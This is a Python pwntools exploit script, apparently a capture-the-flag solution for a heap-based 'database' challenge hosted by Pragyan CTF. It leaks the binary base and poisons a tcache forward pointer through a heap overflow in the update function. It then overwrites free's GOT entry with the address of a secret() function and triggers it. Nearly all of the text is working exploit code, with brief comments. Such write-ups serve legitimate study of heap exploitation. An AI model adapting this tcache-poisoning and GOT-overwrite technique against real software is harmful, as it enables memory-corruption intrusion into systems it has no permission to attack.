#!/usr/bin/env python3

from pwn import *

exe = ELF("./database_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe
context.log_level = 'debug'

def insert(length, data):
    p.sendlineafter(b'choice => ', b'2')
    p.sendlineafter(b'length of string => ', '{}'.format(length).encode())
    p.sendafter(b'string you want to save => ', data)

def update(index, length, data):
    p.sendlineafter(b'choice => ', b'3')
    p.sendlineafter(b'index of element => ', '{}'.format(index).encode())
    p.sendlineafter(b'length of string => ', '{}'.format(length).encode())
    p.sendafter(b'string => ', data)

def remove(index):
    p.sendlineafter(b'choice => ', b'4')
    p.sendlineafter(b'index of element => ', '{}'.format(index).encode())

def show():
    p.sendlineafter(b'choice => ', b'1')

# p = process('./database_patched')
p = connect('binary.challs.pragyanctf.tech', 6004)

# Get binary address
main_address = int(p.recvuntil(b'You have following options').split(b': ')[1].split(b'\n')[0][2:], 16)
exe.address = main_address - 0x1275
log.success("Main address:" + hex(main_address))
log.success("Exe base:" + hex(exe.address))

# Malloc 4 chunks
insert(0x10, b'0'*0x10)    # Control the chunk below
insert(0x10, b'1'*0x10)    # Remove second
insert(0x10, b'2'*0x10)    # Remove first
insert(0x10, b'3'*0x10)    # Avoid heap consolidation

# Move to tcache
remove(2)
remove(1)

# Overwrite forward pointer to free@got
payload = b'0'*0x10
payload += p64(0)
payload += p64(0x21)
payload += p64(exe.got['free'])
update(0, 0x50, payload)

# Overwrite free@got to secret()
insert(0x10, b'1'*0x10)    # Remove second
insert(0x10, p64(exe.sym['secret']))    # Remove first

# Execute secret()
remove(0)

p.interactive()